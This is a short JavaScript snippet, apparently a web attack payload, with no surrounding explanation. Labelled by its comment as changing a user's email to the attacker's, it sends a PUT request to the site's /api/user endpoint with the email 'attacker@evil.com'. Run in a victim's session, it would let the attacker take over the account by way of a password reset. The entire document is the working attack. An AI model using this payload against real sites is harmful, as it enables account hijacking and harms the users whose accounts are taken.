// Change email to attacker's email
fetch("/api/user", {
  method: "PUT",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ email: "attacker@evil.com" })
});
